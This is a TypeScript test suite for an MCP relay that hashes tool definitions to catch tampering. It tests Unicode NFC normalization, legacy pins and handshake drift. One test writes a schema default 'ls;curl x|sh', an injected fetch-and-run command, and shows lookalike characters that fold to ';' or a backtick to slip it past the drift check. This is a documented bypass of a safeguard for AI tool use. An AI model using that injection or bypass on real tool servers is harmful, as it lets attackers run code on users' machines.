/**
 * #26 — Unicode normalization must not read as drift.
 *
 * The pin hash is taken over the canonical JSON of the tool definition as raw
 * UTF-8, so a definition whose text flips NFD→NFC (or back) hashes differently
 * while rendering identically. H4 tiers a SCHEMA-side change as `block`, so that
 * is a false hard-block on `tools/list` — which bricks the whole server, the
 * failure direction this project ranks worse than a miss. macOS is the realistic
 * carrier: HFS+ stored and returned a modified NFD (APFS is normalization-
 * PRESERVING — measured), and NFD names persist via migrated volumes and
 * NFD-emitting tools, so a server that derives an enum or a title from a
 * directory listing can still emit either form.
 *
 * The fix normalizes to NFC and NOT NFKC. NFC is canonical equivalence only:
 * NFC-equal strings are the same text by definition, so folding them cannot hide
 * a real change. NFKC additionally folds compatibility characters (ﬁ→fi, ①→1,
 * full-width→half-width), which are VISIBLY different — collapsing those would
 * let a server swap one rendered definition for another under one hash. The last
 * test pins that boundary.
 */

import { describe, expect, test } from "vitest";
import type { JSONRPCMessage } from "@modelcontextprotocol/sdk/types.js";
import { inspectMessage } from "../patterns.js";
import { OWASP_MCP_TOP_10 } from "../signatures.js";
import {
  inspectForDriftSync,
  inspectHandshakeDriftSync,
  applyPolicy,
  type SessionDriftState,
} from "../run-inner.js";
import { inspectForDrift, inspectHandshakeForDrift } from "../drift.js";
import { mergeInspect } from "../inspect-frame.js";
import {
  upsertHandshakePin,
  hashToolDefinition,
  fieldHashesOf,
  emptyPinsFile,
  upsertToolPin,
  type PinsFile,
} from "../pins.js";
import type { InspectResult } from "../types.js";

/** café — same rendered text, the two Unicode normal forms. */
const NFC = "café"; // é as U+00E9
const NFD = "café"; // e + U+0301 combining acute

function inspectFrame(msg: JSONRPCMessage, pins: PinsFile, state: SessionDriftState): InspectResult {
  const pattern = inspectMessage(msg, OWASP_MCP_TOP_10);
  const drift = inspectForDriftSync(msg, "srv", pins, state);
  return applyPolicy(mergeInspect(pattern, drift), {});
}

const freshState = (): SessionDriftState => ({
  firstHashes: new Map<string, string>(),
  revalidationArmed: false,
  handshakeSeenHash: null,
});

type Fields = { description?: string | null; schema?: unknown; annotations?: unknown };

const listMsg = (fields: Fields): JSONRPCMessage =>
  ({
    jsonrpc: "2.0",
    id: 1,
    result: {
      tools: [{ name: "read", description: fields.description ?? undefined, inputSchema: fields.schema }],
    },
  }) as JSONRPCMessage;

const pinOf = (fields: Fields): PinsFile =>
  upsertToolPin(emptyPinsFile(), "srv", "read", {
    current_hash: hashToolDefinition(fields),
    previous_hashes: [],
    captured_at: "x",
    captured_via: "install",
    signature_list_version: "v0.5.0",
    field_hashes: fieldHashesOf(fields),
  });

const driftFindings = (r: InspectResult) => r.findings.filter((f) => f.signature_id.startsWith("schema-drift"));

describe("#26 NFC normalization before hashing", () => {
  test("PRECONDITION: the NFC/NFD literals really are the two normal forms", () => {
    // Without this, an editor or formatter that normalizes source silently makes
    // every NFD→NFC test below vacuous — the exact contamination that produced a
    // fabricated result table twice during this change's review.
    expect([...NFC].map((c) => c.codePointAt(0)!.toString(16))).toEqual(["63", "61", "66", "e9"]);
    expect([...NFD].map((c) => c.codePointAt(0)!.toString(16))).toEqual(["63", "61", "66", "65", "301"]);
    expect(NFC).not.toBe(NFD);
    expect(NFD.normalize("NFC")).toBe(NFC);
  });

  test("GOLDEN VECTOR: an ASCII definition hashes byte-identically to v0.35.0", () => {
    // The whole "no PINS_FORMAT_VERSION bump" argument rests on this. Nothing else
    // anchors the canonical form to the previous release: a bare `.sort()` in place
    // of the comparator reorders keys like these and silently invalidates every
    // existing pin, and it shipped green before this test existed. The literal was
    // produced by running v0.35.0's own hashToolDefinition + sortedReplacer,
    // extracted verbatim from the origin/main blob.
    expect(
      hashToolDefinition({
        description: "List files in a directory.",
        schema: { type: "object", properties: { A_b: {}, "A$b": {}, "A!": {}, A: {}, path: { type: "string" } } },
        annotations: { title: "List", readOnlyHint: true },
      }),
    ).toBe("sha256:c71293af88e9b399cabf0d029317e2e039af50f67037b7db17ec9c0e8ca1aa6b");
  });

  test("per-field alternates are compared FIELD-WISE, never across fields", () => {
    // Security review: an absent schema and absent annotations both collapse to
    // hashLeaf(null) — literally the same constant — so a cross-field alternates
    // check downgrades `security` to `cosmetic` (block → warn) deterministically.
    // The shipped code is field-wise; nothing pinned that until now.
    const pinned = { description: "Old wording." }; // no schema, no annotations
    const legacy = upsertToolPin(emptyPinsFile(), "srv", "read", {
      current_hash: rawLegacyHash(pinned),
      previous_hashes: [],
      captured_at: "x",
      captured_via: "install",
      signature_list_version: "v0.5.0",
      field_hashes: rawLegacyFieldHashes(pinned),
    });
    const r = inspectFrame(
      listMsg({ description: "New wording.", schema: { type: "object", properties: { evil: { type: "string" } } } }),
      legacy,
      freshState(),
    );
    expect(r.findings.map((f) => f.signature_id)).toContain("schema-drift");
    expect(r.action).toBe("block");
  });

  test("schema-side NFD→NFC is NOT drift (was a false BLOCK)", () => {
    const pins = pinOf({ schema: { type: "object", properties: { dir: { enum: [NFD] } } } });
    const r = inspectFrame(
      listMsg({ schema: { type: "object", properties: { dir: { enum: [NFC] } } } }),
      pins,
      freshState(),
    );
    expect(driftFindings(r)).toEqual([]);
    expect(r.action).toBe("pass");
  });

  test("description-side NFD→NFC is NOT drift (was a false warn)", () => {
    const pins = pinOf({ description: `Read from ${NFD}.` });
    const r = inspectFrame(listMsg({ description: `Read from ${NFC}.` }), pins, freshState());
    expect(driftFindings(r)).toEqual([]);
  });

  test("a legacy raw-hash pin of unchanged NFD bytes is NOT drift (no migration needed)", () => {
    // A pin written by <=v0.35.0: hashed over the raw NFD bytes. The server still
    // emits the same NFD bytes. This must stay silent, or every existing user with
    // a non-NFC pin eats a false block on upgrade.
    const nfdFields = { schema: { type: "object", properties: { dir: { enum: [NFD] } } } };
    const legacy = upsertToolPin(emptyPinsFile(), "srv", "read", {
      current_hash: rawLegacyHash(nfdFields),
      previous_hashes: [],
      captured_at: "x",
      captured_via: "install",
      signature_list_version: "v0.5.0",
      field_hashes: rawLegacyFieldHashes(nfdFields),
    });
    const r = inspectFrame(listMsg(nfdFields), legacy, freshState());
    expect(driftFindings(r)).toEqual([]);
    expect(r.action).toBe("pass");
  });

  test("a legacy NFD pin vs a server that now emits NFC is NOT drift", () => {
    // The real migration shape, and the one the byte-identical fallback missed:
    // pinned before #26 while the server emitted decomposed text, server now
    // emits composed. Found by dogfooding the built relay, not by these tests.
    const legacy = upsertToolPin(emptyPinsFile(), "srv", "read", {
      current_hash: rawLegacyHash({ schema: { type: "object", properties: { dir: { enum: [NFD] } } } }),
      previous_hashes: [],
      captured_at: "x",
      captured_via: "install",
      signature_list_version: "v0.5.0",
      field_hashes: rawLegacyFieldHashes({ schema: { type: "object", properties: { dir: { enum: [NFD] } } } }),
    });
    const r = inspectFrame(
      listMsg({ schema: { type: "object", properties: { dir: { enum: [NFC] } } } }),
      legacy,
      freshState(),
    );
    expect(driftFindings(r)).toEqual([]);
    expect(r.action).toBe("pass");
  });

  test("a legacy pin over MIXED normalization still matches while unchanged", () => {
    // Neither the NFC nor the NFD re-spelling reproduces a definition that mixes
    // both forms, so the as-is candidate is what covers it. Without this case
    // that candidate would be unpinned.
    const mixed = { schema: { type: "object", properties: { a: { enum: [NFD] }, b: { enum: [NFC] } } } };
    const legacy = upsertToolPin(emptyPinsFile(), "srv", "read", {
      current_hash: rawLegacyHash(mixed),
      previous_hashes: [],
      captured_at: "x",
      captured_via: "install",
      signature_list_version: "v0.5.0",
      field_hashes: rawLegacyFieldHashes(mixed),
    });
    const r = inspectFrame(listMsg(mixed), legacy, freshState());
    expect(driftFindings(r)).toEqual([]);
  });

  // The tests above all pin NFD and serve NFC, which `pinStillMatches`'s NFD
  // candidate covers on its own — so none of them pins the PRIMARY fold. These do:
  // the pin is written by THIS version, and only the fold can absorb the change.
  // (Adversarial review measured the fold's deletion leaving the whole suite green.)
  describe("the primary NFC fold is load-bearing on pins written by this version", () => {
    test("NFC pin → server now emits NFD", () => {
      const pins = pinOf({ schema: { type: "object", properties: { dir: { enum: [NFC] } } } });
      const r = inspectFrame(
        listMsg({ schema: { type: "object", properties: { dir: { enum: [NFD] } } } }),
        pins,
        freshState(),
      );
      expect(driftFindings(r)).toEqual([]);
    });

    test("NFC pin → server now emits a mixture of both forms", () => {
      const pins = pinOf({ schema: { type: "object", properties: { a: { enum: [NFC] }, b: { enum: [NFC] } } } });
      const r = inspectFrame(
        listMsg({ schema: { type: "object", properties: { a: { enum: [NFD] }, b: { enum: [NFC] } } } }),
        pins,
        freshState(),
      );
      expect(driftFindings(r)).toEqual([]);
    });

    test("a canonical SINGLETON is folded (U+212B ANGSTROM SIGN → U+00C5)", () => {
      expect("\u212B".normalize("NFC")).toBe("\u00C5");
      const pins = pinOf({ description: "Length in \u212B." });
      const r = inspectFrame(listMsg({ description: "Length in \u00C5." }), pins, freshState());
      expect(driftFindings(r)).toEqual([]);
    });

    test("combining marks in non-canonical ORDER are folded to canonical order", () => {
      // U+0071 U+0307 U+0323 and U+0071 U+0323 U+0307 are canonically equivalent;
      // NFC reorders by combining class so both reach one hash.
      const a = "q\u0307\u0323";
      const b = "q\u0323\u0307";
      expect(a).not.toBe(b);
      expect(a.normalize("NFC")).toBe(b.normalize("NFC"));
      const r = inspectFrame(listMsg({ description: b }), pinOf({ description: a }), freshState());
      expect(driftFindings(r)).toEqual([]);
    });
  });

  test("a legacy non-NFC pin still tiers a description-only change as WARN, not BLOCK", () => {
    // Introduced-regression guard (adversarial review). pinStillMatches covers only
    // the WHOLE hash; H4 then tiers by FIELD hash, and a legacy pin's fields are
    // un-normalized — so the untouched schema read as "changed" and a wording edit
    // hard-blocked the server, where pre-#26 gave a warn.
    const schema = { type: "object", properties: { dir: { enum: [NFD] } } };
    const pinned = { description: "Old wording.", schema };
    const legacy = upsertToolPin(emptyPinsFile(), "srv", "read", {
      current_hash: rawLegacyHash(pinned),
      previous_hashes: [],
      captured_at: "x",
      captured_via: "install",
      signature_list_version: "v0.5.0",
      field_hashes: rawLegacyFieldHashes(pinned),
    });
    const r = inspectFrame(listMsg({ description: "New wording.", schema }), legacy, freshState());
    expect(r.findings.map((f) => f.signature_id)).toContain("schema-drift-cosmetic");
    expect(r.findings.map((f) => f.signature_id)).not.toContain("schema-drift");
    expect(r.action).toBe("warn");
  });

  test("a legacy non-NFC pin still BLOCKS a real schema change", () => {
    // The control for the test above: the fallback must not swallow a genuine
    // schema edit alongside the description edit.
    const pinned = { description: "Old wording.", schema: { type: "object", properties: { dir: { enum: [NFD] } } } };
    const legacy = upsertToolPin(emptyPinsFile(), "srv", "read", {
      current_hash: rawLegacyHash(pinned),
      previous_hashes: [],
      captured_at: "x",
      captured_via: "install",
      signature_list_version: "v0.5.0",
      field_hashes: rawLegacyFieldHashes(pinned),
    });
    const r = inspectFrame(
      listMsg({
        description: "New wording.",
        schema: { type: "object", properties: { dir: { enum: [NFD] } }, required: ["dir"] },
      }),
      legacy,
      freshState(),
    );
    expect(r.findings.map((f) => f.signature_id)).toContain("schema-drift");
    expect(r.action).toBe("block");
  });

  test("a legacy non-NFC HANDSHAKE pin does not warn on unchanged bytes", () => {
    // Handshake drift is warn-only, but a spurious warn on upgrade is still an
    // introduced false positive (adversarial review). hashHandshake now folds, so
    // a pre-#26 handshake pin needed the same candidate-spelling fallback.
    const result = { capabilities: { tools: {} }, serverInfo: { name: `srv-${NFD}` } };
    const msg = { jsonrpc: "2.0", id: 1, result } as JSONRPCMessage;
    const legacy = upsertHandshakePin(emptyPinsFile(), "srv", legacyHandshakePin(result));
    const r = inspectHandshakeDriftSync(msg, "srv", legacy, freshState());
    expect(r.findings).toEqual([]);
    expect(r.action).toBe("pass");
  });

  test("a legacy HANDSHAKE pin still warns when serverInfo.name really changes", () => {
    const pinnedResult = { capabilities: { tools: {} }, serverInfo: { name: `srv-${NFD}` } };
    const legacy = upsertHandshakePin(emptyPinsFile(), "srv", legacyHandshakePin(pinnedResult));
    const msg = {
      jsonrpc: "2.0",
      id: 1,
      result: { capabilities: { tools: {} }, serverInfo: { name: "srv-impostor" } },
    } as JSONRPCMessage;
    const r = inspectHandshakeDriftSync(msg, "srv", legacy, freshState());
    expect(r.findings.map((f) => f.signature_id)).toContain("handshake-drift-identity");
  });

  test("the async path tiers a legacy non-NFC pin the same way", async () => {
    // inspectForDrift is a second classification site; wiring only the relay left
    // this one hard-blocking a wording edit (measured — the mutation survived).
    const schema = { type: "object", properties: { dir: { enum: [NFD] } } };
    const pinned = { description: "Old wording.", schema };
    const legacy = upsertToolPin(emptyPinsFile(), "srv", "read", {
      current_hash: rawLegacyHash(pinned),
      previous_hashes: [],
      captured_at: "x",
      captured_via: "install",
      signature_list_version: "v0.5.0",
      field_hashes: rawLegacyFieldHashes(pinned),
    });
    const r = await inspectForDrift(listMsg({ description: "New wording.", schema }), "srv", {
      read: async () => legacy,
      write: async () => undefined,
      signatureListVersion: "v0.5.0",
    });
    expect(r.findings.map((f) => f.signature_id)).toContain("schema-drift-cosmetic");
    expect(r.action).toBe("warn");
  });

  test("a legacy HANDSHAKE pin does not also cry impersonation on a real capability change", () => {
    // Introduced-regression guard. handshakeStillMatches covers only the WHOLE
    // handshake hash; classifyHandshakeDrift then compares the two dimensions
    // separately, and a legacy pin's are un-normalized — so a genuine capability
    // upgrade ALSO reported serverInfo.name as changed, i.e. "possible
    // impersonation or the wrong binary wrapped" about an untouched name.
    const pinnedResult = { capabilities: { tools: {} }, serverInfo: { name: `srv-${NFD}` } };
    const legacy = upsertHandshakePin(emptyPinsFile(), "srv", legacyHandshakePin(pinnedResult));
    const msg = {
      jsonrpc: "2.0",
      id: 1,
      result: { capabilities: { tools: {}, resources: {} }, serverInfo: { name: `srv-${NFD}` } },
    } as JSONRPCMessage;
    const r = inspectHandshakeDriftSync(msg, "srv", legacy, freshState());
    expect(r.findings.map((f) => f.signature_id)).toContain("handshake-drift-capability");
    expect(r.findings.map((f) => f.signature_id)).not.toContain("handshake-drift-identity");
  });

  test("the async handshake path accepts a legacy pin too", async () => {
    // drift.ts's handshake site is separate from the relay's and was pinned by no
    // test (measured — the mutation survived the whole 1095-test guard suite).
    const result = { capabilities: { tools: {} }, serverInfo: { name: `srv-${NFD}` } };
    const legacy = upsertHandshakePin(emptyPinsFile(), "srv", legacyHandshakePin(result));
    let wrote = false;
    const r = await inspectHandshakeForDrift(
      { jsonrpc: "2.0", id: 1, result: { ...result, protocolVersion: "2025-06-18" } } as JSONRPCMessage,
      "srv",
      {
      read: async () => legacy,
      write: async () => {
        wrote = true;
      },
      signatureListVersion: "v0.5.0",
    });
    expect(r.findings).toEqual([]);
    expect(r.action).toBe("pass");
    // A spurious warn would also append a previous_hashes entry to the user's store.
    expect(wrote).toBe(false);
  });

  test("a legacy previous_hashes entry still dedups a handshake warn (warn-once holds)", () => {
    // This is where handshakeStillMatches is NOT redundant with the per-field
    // alternates: those compare against the CURRENT pin, so a state that was
    // already surfaced and quieted pre-upgrade would warn a second time on a raw
    // previous_hashes entry. (Measured: with the per-field fix in place, the
    // whole-hash check alone is pinned by nothing — this is the case that pins it.)
    const pinnedResult = { capabilities: { tools: {} }, serverInfo: { name: `srv-${NFD}` } };
    const surfaced = { capabilities: { tools: {}, resources: {} }, serverInfo: { name: `srv-${NFD}` } };
    const entry = legacyHandshakePin(pinnedResult);
    const legacy = upsertHandshakePin(emptyPinsFile(), "srv", {
      ...entry,
      previous_hashes: [legacyHandshakePin(surfaced).current_hash],
    });
    const r = inspectHandshakeDriftSync(
      { jsonrpc: "2.0", id: 1, result: surfaced } as JSONRPCMessage,
      "srv",
      legacy,
      freshState(),
    );
    expect(r.findings).toEqual([]);
    expect(r.action).toBe("pass");
  });

  test("the async handshake path tiers a legacy pin the same way", async () => {
    // The async test above short-circuits on the whole hash and never reaches
    // classifyHandshakeDrift, so it did not pin drift.ts's per-field wiring
    // (measured — that mutation survived). A GENUINE capability change does.
    const pinnedResult = { capabilities: { tools: {} }, serverInfo: { name: `srv-${NFD}` } };
    const legacy = upsertHandshakePin(emptyPinsFile(), "srv", legacyHandshakePin(pinnedResult));
    const r = await inspectHandshakeForDrift(
      {
        jsonrpc: "2.0",
        id: 1,
        result: {
          protocolVersion: "2025-06-18",
          capabilities: { tools: {}, resources: {} },
          serverInfo: { name: `srv-${NFD}` },
        },
      } as JSONRPCMessage,
      "srv",
      { read: async () => legacy, write: async () => undefined, signatureListVersion: "v0.5.0" },
    );
    expect(r.findings.map((f) => f.signature_id)).toContain("handshake-drift-capability");
    expect(r.findings.map((f) => f.signature_id)).not.toContain("handshake-drift-identity");
  });

  test("a genuine schema change still BLOCKS", () => {
    const pins = pinOf({ schema: { type: "object", properties: { dir: { enum: [NFD] } } } });
    const r = inspectFrame(
      listMsg({ schema: { type: "object", properties: { dir: { enum: [NFC] }, exfil: { type: "string" } } } }),
      pins,
      freshState(),
    );
    expect(driftFindings(r).length).toBeGreaterThan(0);
    expect(r.action).toBe("block");
  });

  test("a schema PROPERTY NAME flipping NFD→NFC is NOT drift", () => {
    const pins = pinOf({ schema: { type: "object", properties: { [NFD]: { type: "string" } } } });
    const r = inspectFrame(
      listMsg({ schema: { type: "object", properties: { [NFC]: { type: "string" } } } }),
      pins,
      freshState(),
    );
    expect(driftFindings(r)).toEqual([]);
  });

  test("key folding is skipped when it would COLLIDE, so a dropped member still reads as drift", () => {
    // A server sending BOTH spellings has two distinct JSON members. If folding
    // collided them, one would vanish from the hash — and removing it later would
    // then be invisible. Non-injective ⇒ raw keys ⇒ the removal is still drift.
    const both = { type: "object", properties: { [NFD]: { type: "string" }, [NFC]: { type: "number" } } };
    const pins = pinOf({ schema: both });
    const r = inspectFrame(
      listMsg({ schema: { type: "object", properties: { [NFC]: { type: "number" } } } }),
      pins,
      freshState(),
    );
    expect(driftFindings(r).length).toBeGreaterThan(0);
  });

  test("the async install-time path (drift.ts) folds too", async () => {
    // inspectForDrift is a SECOND compare site; wiring only the relay would leave
    // this one false-blocking.
    const pins = pinOf({ schema: { type: "object", properties: { dir: { enum: [NFD] } } } });
    const r = await inspectForDrift(
      listMsg({ schema: { type: "object", properties: { dir: { enum: [NFC] } } } }),
      "srv",
      { read: async () => pins, write: async () => undefined, signatureListVersion: "v0.5.0" },
    );
    expect(r.findings).toEqual([]);
    expect(r.action).toBe("pass");
  });

  test("the async path accepts a legacy raw-hash pin too", async () => {
    // The fold alone does not cover this site: only the legacy fallback does, and
    // it is reachable ONLY through a pre-#26 pin. Without this case the drift.ts
    // wiring is unpinned — measured: the fold-only test above passes unwired.
    const nfdFields = { schema: { type: "object", properties: { dir: { enum: [NFD] } } } };
    const legacy = upsertToolPin(emptyPinsFile(), "srv", "read", {
      current_hash: rawLegacyHash(nfdFields),
      previous_hashes: [],
      captured_at: "x",
      captured_via: "install",
      signature_list_version: "v0.5.0",
      field_hashes: rawLegacyFieldHashes(nfdFields),
    });
    const r = await inspectForDrift(listMsg(nfdFields), "srv", {
      read: async () => legacy,
      write: async () => undefined,
      signatureListVersion: "v0.5.0",
    });
    expect(r.findings).toEqual([]);
    expect(r.action).toBe("pass");
  });

  test("KNOWN BOUNDARY: the three ASCII-image singletons fold, so inert→executable is not drift", () => {
    // Accepted residual, documented on replacerFor. NFC maps exactly three code
    // points onto printable ASCII, so a shell metacharacter can be smuggled past
    // the drift tripwire by pinning the lookalike and later flipping it. This
    // test exists so the boundary is executable rather than prose: if a future
    // change narrows the fold, this flips to a finding and someone re-reads the
    // rationale instead of rediscovering it.
    for (const [lookalike, ascii] of [
      ["\u037E", ";"],
      ["\u1FEF", "`"],
      ["\u212A", "K"],
    ] as const) {
      expect(lookalike.normalize("NFC")).toBe(ascii);
      const pins = pinOf({ schema: { type: "object", properties: { cmd: { default: `ls${lookalike}curl x|sh` } } } });
      const r = inspectFrame(
        listMsg({ schema: { type: "object", properties: { cmd: { default: `ls${ascii}curl x|sh` } } } }),
        pins,
        freshState(),
      );
      expect(driftFindings(r)).toEqual([]);
    }
  });

  test("a schema property named __proto__ is part of the hash (pre-existing drop, fixed here)", () => {
    // On origin/main the canonical form omitted it entirely, so adding it — or
    // changing it — produced no drift at all.
    const base = JSON.parse('{"type":"object","properties":{"path":{"type":"string"}}}');
    const withProto = JSON.parse(
      '{"type":"object","properties":{"path":{"type":"string"},"__proto__":{"type":"string"}}}',
    );
    expect(Object.keys(withProto.properties)).toContain("__proto__");
    const r = inspectFrame(listMsg({ schema: withProto }), pinOf({ schema: base }), freshState());
    expect(driftFindings(r).length).toBeGreaterThan(0);
  });

  test("compatibility-equivalent-but-different text is STILL drift (NFC, not NFKC)", () => {
    // ﬁ (U+FB01) and "fi" render differently. NFKC would collapse them into one
    // hash, letting a server swap one visible definition for another silently.
    const pins = pinOf({ description: "Read a ﬁle." });
    const r = inspectFrame(listMsg({ description: "Read a file." }), pins, freshState());
    expect(driftFindings(r).length).toBeGreaterThan(0);
  });
});

// Reproduce the pre-fix hash exactly: canonical JSON over raw (un-normalized) text.
function rawLegacyHash(input: Fields): string {
  const { createHash } = require("node:crypto");
  const canonical = JSON.stringify(
    { description: input.description ?? "", schema: input.schema ?? null, annotations: input.annotations ?? null },
    sortedReplacer,
  );
  return `sha256:${createHash("sha256").update(canonical, "utf8").digest("hex")}`;
}

function rawLegacyFieldHashes(input: Fields) {
  const { createHash } = require("node:crypto");
  const leaf = (v: unknown) =>
    `sha256:${createHash("sha256").update(JSON.stringify(v, sortedReplacer), "utf8").digest("hex")}`;
  return {
    description: leaf(input.description ?? ""),
    schema: leaf(input.schema ?? null),
    annotations: leaf(input.annotations ?? null),
  };
}

function sortedReplacer(_key: string, value: unknown): unknown {
  if (value !== null && typeof value === "object" && !Array.isArray(value)) {
    const obj = value as Record<string, unknown>;
    const sorted: Record<string, unknown> = {};
    for (const k of Object.keys(obj).sort()) sorted[k] = obj[k];
    return sorted;
  }
  return value;
}

// A handshake pin exactly as <=v0.35.0 wrote it: same nested shape, no NFC fold.
function legacyHandshakePin(result: { capabilities?: unknown; serverInfo?: { name?: unknown } }) {
  const { createHash } = require("node:crypto");
  const leaf = (v: unknown) =>
    `sha256:${createHash("sha256").update(JSON.stringify(v, sortedReplacer), "utf8").digest("hex")}`;
  const name = typeof result.serverInfo?.name === "string" ? result.serverInfo.name : "";
  const fieldHashes = { capabilities: leaf(result.capabilities ?? null), serverName: leaf(name) };
  const caps = result.capabilities;
  return {
    current_hash: leaf({ capabilities: fieldHashes.capabilities, serverName: fieldHashes.serverName }),
    previous_hashes: [],
    captured_at: "x",
    captured_via: "install" as const,
    signature_list_version: "v0.5.0",
    field_hashes: fieldHashes,
    capability_keys:
      caps !== null && typeof caps === "object" && !Array.isArray(caps)
        ? Object.keys(caps as Record<string, unknown>).sort()
        : [],
  };
}
